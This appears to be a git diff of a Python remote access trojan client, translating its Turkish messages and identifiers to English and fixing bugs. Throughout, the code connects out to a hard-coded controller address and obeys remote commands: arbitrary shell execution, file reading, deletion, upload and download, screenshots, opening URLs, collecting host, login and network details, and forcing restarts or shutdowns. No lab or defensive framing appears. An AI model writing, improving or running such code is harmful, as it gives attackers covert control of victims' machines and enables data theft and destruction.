@@ -7,16 +7,14 @@ import platform
 import webbrowser
 import pyautogui
 
-
 def os_info():
     info = {
-    'İşletim Sistemi': platform.system(),
-    'Python Version': platform.python_version(),
-    'Bit Version': platform.machine(),
-    'HostName': socket.gethostbyname(socket.gethostname()),
-    'Login Name': os.getlogin(),
-    'OS Name': os.name,
-
+        'Operating System': platform.system(),
+        'Python Version': platform.python_version(),
+        'Bit Version': platform.machine(),
+        'HostName': socket.gethostbyname(socket.gethostname()),
+        'Login Name': os.getlogin(),
+        'OS Name': os.name,
     }
     return info
 
@@ -35,7 +33,7 @@ def get_memory_info():
             return f"Error: {result.stderr.strip()}"
     except Exception as e:
         return f"Error: {str(e)}"
-        
+
 def get_network_info():
     network_info = ""
     af_map = {
@@ -44,14 +42,14 @@ def get_network_info():
     }
     interfaces = psutil.net_if_addrs()
     for interface, addresses in interfaces.items():
-        network_info += f"Ağ Arayüzü: {interface}\n"
+        network_info += f"Network Interface: {interface}\n"
         for addr in addresses:
-            network_info += f"  Adres Türü: {af_map.get(addr.family, addr.family)}\n"
-            network_info += f"  Adres: {addr.address}\n"
+            network_info += f"  Address Type: {af_map.get(addr.family, addr.family)}\n"
+            network_info += f"  Address: {addr.address}\n"
             if addr.broadcast:
-                network_info += f"    Yayın Adresi: {addr.broadcast}\n"
+                network_info += f"    Broadcast Address: {addr.broadcast}\n"
             if addr.netmask:
-                network_info += f"    Ağ Maskesi: {addr.netmask}\n"
+                network_info += f"    Netmask: {addr.netmask}\n"
     return network_info
 
 def execute_command(command):
@@ -63,7 +61,6 @@ def execute_command(command):
             return f"Error: {result.stderr.strip()}"
     except Exception as e:
         return f"Error: {str(e)}"
-        
 
 def main():
     ip = '192.168.1.36' 
@@ -72,7 +69,7 @@ def main():
     while True:
         with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
             s.connect((ip, port))
-            print("Sunucuya bağlanıldı.")
+            print("Connected to server.")
         
             while True:
                 command = s.recv(8192).decode()
@@ -84,91 +81,86 @@ def main():
                     break
 
                 elif command == 'execute':
-                    komut = s.recv(8192).decode()
-                    output = execute_command(komut)
+                    cmd = s.recv(8192).decode()
+                    output = execute_command(cmd)
                     s.send(output.encode())
 
                 elif command.startswith('openfile'):
-                    dosya_adi = command.split(" ", 1)[1]
+                    filename = command.split(" ", 1)[1]
                     try:
-                        with open(dosya_adi, "r") as dosya:
-                            icerik = dosya.read()
-                        s.sendall(icerik.encode())
+                        with open(filename, "r") as file:
+                            content = file.read()
+                        s.sendall(content.encode())
                     except FileNotFoundError:
-                        s.send("Dosya bulunamadı".encode())
+                        s.send("File not found".encode())
                     except Exception as e:
-                        s.send(f"Hata: {str(e)}".encode())
+                        s.send(f"Error: {str(e)}".encode())
 
                 elif command.startswith('deletefile'):
-                    dosya_adi = command.split(" ", 1)[1]
+                    filename = command.split(" ", 1)[1]
                     try:
-                        os.remove(dosya_adi)
-                        s.send(f"{dosya_adi} başarıyla silindi.".encode())
+                        os.remove(filename)
+                        s.send(f"{filename} has been successfully deleted.".encode())
                     except FileNotFoundError:
-                        s.send(f"{dosya_adi} bulunamadı".encode())
+                        s.send(f"{filename} not found".encode())
                     except Exception as e:
-                        s.send(f"Hata: {str(e)}".encode())
+                        s.send(f"Error: {str(e)}".encode())
 
                 elif command.startswith('deletedirectory'):
-                    hedef_dizin = command.split(" ", 1)[1]
+                    target_directory = command.split(" ", 1)[1]
                     try:
-                        os.rmdir(hedef_dizin)
-                        s.send(f"{hedef_dizin} başarıyla silindi.".encode())
+                        os.rmdir(target_directory)
+                        s.send(f"{target_directory} has been successfully deleted.".encode())
                     except FileNotFoundError:
-                        s.send(f"{hedef_dizin} bulunamadı".encode())
+                        s.send(f"{target_directory} not found".encode())
                     except Exception as e:
-                        s.send(f"Hata: {str(e)}".encode())
+                        s.send(f"Error: {str(e)}".encode())
                     
                 elif command.startswith('ls') or command.startswith('dir'):
-                    dosyalar = os.listdir()
-                    if dosyalar:
-                        s.send("\n".join(dosyalar).encode())
+                    files = os.listdir()
+                    if files:
+                        s.send("\n".join(files).encode())
                     else:
-                        s.send("Dizin boş".encode())
+                        s.send("Directory is empty".encode())
 
                 elif command.startswith('cd'):
-                    hedefklasor = command.split(" ", 1)[1]
+                    target_folder = command.split(" ", 1)[1]
                     try:
-                        os.chdir(hedefklasor)
-                        s.send(f"Dizin değiştirildi: {os.getcwd()}".encode())
+                        os.chdir(target_folder)
+                        s.send(f"Directory changed to: {os.getcwd()}".encode())
                     except FileNotFoundError:
-                        s.send("Hata: Dizin bulunamadı".encode())
+                        s.send("Error: Directory not found".encode())
                     except Exception as e:
-                        s.send(f"Hata: {str(e)}".encode())
+                        s.send(f"Error: {str(e)}".encode())
 
                 elif command.startswith('createdirectory'):
-                    hedefklasor = command.split(" ", 1)[1]
+                    target_folder = command.split(" ", 1)[1]
                     try:
-                        os.mkdir(hedefklasor)
-                        s.send(f"{hedefklasor} başarıyla oluşturuldu.".encode())
+                        os.mkdir(target_folder)
+                        s.send(f"{target_folder} has been successfully created.".encode())
                     except FileExistsError:
-                        s.send(f"{hedefklasor} zaten var.".encode())
+                        s.send(f"{target_folder} already exists.".encode())
                     except Exception as e:
-                        s.send(f"Hata: {str(e)}".encode())
+                        s.send(f"Error: {str(e)}".encode())
 
                 elif command.startswith("createfile"):
-                    dosyaisim = command.split(" ", 1)[1]
-                    with open(dosyaisim, "w") as dosya:
+                    filename = command.split(" ", 1)[1]
+                    with open(filename, "w") as file:
                         pass
-                    s.send("Dosya oluşturuldu.".encode())
+                    s.send("File created.".encode())
             
                 elif command.startswith("editfile"):
-                    komut_parcalari = command.split(" ")
-                    dosya_isim_index = komut_parcalari.index(">>") + 1
-                    dosya_isim = komut_parcalari[dosya_isim_index]
-                    metin = " ".join(komut_parcalari[1:dosya_isim_index-1])
-                    with open(dosyaisim, "a") as dosya:
-                        dosya.write(metin)
-                    s.send("Metin dosya sonuna eklendi.".encode())
-                    
+                    parts = command.split(" ")
+                    file_name_index = parts.index(">>") + 1
+                    file_name = parts[file_name_index]
+                    text = " ".join(parts[1:file_name_index-1])
+                    with open(file_name, "a") as file:
+                        file.write(text)
+                    s.send("Text appended to file.".encode())
                 
-    
-                    
-
                 elif command == "whoami":
-                    cikti = subprocess.run
-                    cikti = subprocess.run(['whoami'], capture_output=True, text=True)
-                    s.send(cikti.stdout.encode())
+                    result = subprocess.run(['whoami'], capture_output=True, text=True)
+                    s.send(result.stdout.encode())
                 
                 elif command == "ifconfig":
                     x = get_network_info()
@@ -183,16 +175,15 @@ def main():
                     s.send(x)
                 
                 elif command == "osinfo":
-                    os_info = os_info()
+                    os_info_data = os_info()
                     formatted_str = ""
-                    for key, value in os_info.items():
+                    for key, value in os_info_data.items():
                         formatted_str += f"{key}: {value}\n"
-                        os_info = formatted_str
-                    s.send(str(os_info).encode())
+                    s.send(formatted_str.encode())
                     
                 elif command == 'upload':
-                    dosya_adi = s.recv(8192).decode()
-                    with open(dosya_adi, 'wb') as file:
+                    filename = s.recv(8192).decode()
+                    with open(filename, 'wb') as file:
                         while True:
                             data = s.recv(8192)
                             if data.endswith('UPLOAD_COMPLETE'.encode()):
@@ -200,20 +191,19 @@ def main():
                                 break
                             file.write(data)
                             
-                        
                 elif command == 'download':
-                    dosya_adi = s.recv(8192).decode()
+                    filename = s.recv(8192).decode()
                     try:
-                        with open(dosya_adi, 'rb') as file:
-                            while (data := file.read(819229383)):
+                        with open(filename, 'rb') as file:
+                            while (data := file.read(8192)):
                                 if not data:
-                                    s.send('Dosya boş'.encode())
+                                    s.send('File is empty'.encode())
                                     continue
                                 else:    
                                     s.send(data)
                                     s.send('DOWNLOAD_COMPLETE'.encode())
                     except FileNotFoundError:
-                        s.send('HATA: Dosya bulunamadı.'.encode())
+                        s.send('ERROR: File not found.'.encode())
         
                 elif command == 'screenshot':
                     screenshot = pyautogui.screenshot()
@@ -233,9 +223,9 @@ def main():
                         link = "http://" + link
                     try:
                         webbrowser.open(link)
-                        s.send('Url Açıldı.'.encode())
+                        s.send('URL Opened.'.encode())
                     except Exception as e:
-                        s.send(f'Url açılırken hata oluştu: {str(e)}'.encode())
+                        s.send(f'Error opening URL: {str(e)}'.encode())
                         
                 elif command == 'restart':
                     x = os.name
@@ -244,7 +234,7 @@ def main():
                     elif x == 'nt':
                         result = subprocess.run(['shutdown', '/r', '/t', '0'], shell=True, capture_output=True, text=True)
                     
-                    if result.returncode == 0:  
+                    if result.returncode == 0:
                         s.send(result.stdout.strip().encode())
                     else:
                         s.send(result.stderr.strip().encode())
@@ -256,14 +246,12 @@ def main():
                     elif x == 'nt':
                         result = subprocess.run(['shutdown', '/s'], shell=True, capture_output=True, text=True)
                     
-                    if result.returncode == 0:  
+                    if result.returncode == 0:
                         s.send(result.stdout.strip().encode())
                     else:
                         s.send(result.stderr.strip().encode())
                         
-                        
-                             
-    print("Bağlantı kesildi.")
+    print("Connection closed.")
 
 if __name__ == "__main__":
     main()
